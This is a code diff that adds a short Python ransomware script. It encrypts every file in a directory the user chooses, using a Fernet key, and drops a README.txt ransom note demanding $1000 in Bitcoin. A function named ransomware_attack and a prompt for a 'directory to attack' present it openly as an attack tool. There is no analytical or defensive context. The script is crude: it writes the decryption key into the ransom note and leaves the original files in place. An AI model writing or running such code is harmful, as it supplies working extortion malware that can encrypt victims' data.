@@ -1,0 +1,45 @@
+import os
+import random
+import string
+from cryptography.fernet import Fernet
+
+def generate_random_key():
+    return Fernet.generate_key()
+
+def encrypt_file(file_path, key):
+    fernet = Fernet(key)
+    with open(file_path, 'rb') as f:
+        data = f.read()
+    encrypted_data = fernet.encrypt(data)
+    with open(file_path + '.encrypted', 'wb') as f:
+        f.write(encrypted_data)
+
+def decrypt_file(encrypted_file_path, key):
+    fernet = Fernet(key)
+    with open(encrypted_file_path, 'rb') as f:
+        encrypted_data = f.read()
+    decrypted_data = fernet.decrypt(encrypted_data)
+    with open(encrypted_file_path[:-len('.encrypted')], 'wb') as f:
+        f.write(decrypted_data)
+
+def encrypt_files_in_directory(directory, key):
+    for filename in os.listdir(directory):
+        file_path = os.path.join(directory, filename)
+        if os.path.isfile(file_path):
+            encrypt_file(file_path, key)
+
+def decrypt_files_in_directory(directory, key):
+    for filename in os.listdir(directory):
+        file_path = os.path.join(directory, filename)
+        if os.path.isfile(file_path) and file_path.endswith('.encrypted'):
+            decrypt_file(file_path, key)
+
+def ransomware_attack(directory):
+    key = generate_random_key()
+    encrypt_files_in_directory(directory, key)
+    with open(os.path.join(directory, 'README.txt'), 'w') as f:
+        f.write(f'Your files have been encrypted. To decrypt them, send $1000 worth of Bitcoin to the following address: [Bitcoin_address_here]. Once payment is received, contact [email_address_here] with your unique key: {key.decode()}')
+
+if __name__ == "__main__":
+    target_directory = input("Enter the directory to attack: ")
+    ransomware_attack(target_directory)
